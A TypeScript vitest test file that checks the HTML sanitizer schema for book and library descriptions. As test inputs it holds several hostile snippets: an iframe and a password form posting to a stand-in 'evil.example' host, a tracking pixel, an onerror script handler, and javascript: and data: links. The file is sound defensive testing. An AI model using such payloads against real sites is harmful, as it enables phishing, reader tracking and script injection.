import { fromParse5 } from 'hast-util-from-parse5'
import { sanitize } from 'hast-util-sanitize'
import { toHtml } from 'hast-util-to-html'
import { parseFragment } from 'parse5'
import { describe, expect, it } from 'vitest'

import { SANITIZE_SCHEMA } from '../MarkdownPreview'

/**
 * Book, series and library descriptions are rendered as HTML (`rehypeRaw`), and they come
 * straight out of files people download from the internet. Formatting has to survive; anything
 * else must not: a remote image tells a stranger who read what and when, an off-site form turns
 * a trusted page into a phishing prompt, and an iframe or style block repaints the app around
 * the reader. This exercises the schema the renderer is configured with.
 */
const clean = (html: string) =>
	toHtml(sanitize(fromParse5(parseFragment(html)), SANITIZE_SCHEMA as never))

describe('description sanitizing', () => {
	it('keeps the formatting a description legitimately uses', () => {
		const out = clean(
			'<p>Plain <i>italic</i>, <strong>bold</strong> and a <a href="https://example.com/book">link</a></p>',
		)

		expect(out).toContain('<i>italic</i>')
		expect(out).toContain('<strong>bold</strong>')
		expect(out).toContain('href="https://example.com/book"')
	})

	it('drops frames, forms and style blocks', () => {
		const out = clean(
			'<iframe src="https://evil.example/"></iframe>' +
				'<form action="https://evil.example/steal"><input name="password" /></form>' +
				'<style>body{display:none}</style>',
		)

		expect(out).not.toContain('<iframe')
		expect(out).not.toContain('<form')
		expect(out).not.toContain('<input')
		expect(out).not.toContain('<style')
	})

	it('does not load images from other servers', () => {
		const out = clean('<img src="https://evil.example/tracker.png" alt="pixel">')

		expect(out).not.toContain('evil.example')
	})

	it('strips event handlers and unsafe link protocols', () => {
		const out = clean(
			'<img src="x" onerror="window.__xss = 1">' +
				'<a href="javascript:window.__xss = 1">click</a>' +
				'<a href="data:text/html,hi">data</a>',
		)

		expect(out).not.toContain('onerror')
		expect(out).not.toContain('javascript:')
		expect(out).not.toContain('data:text/html')
	})
})
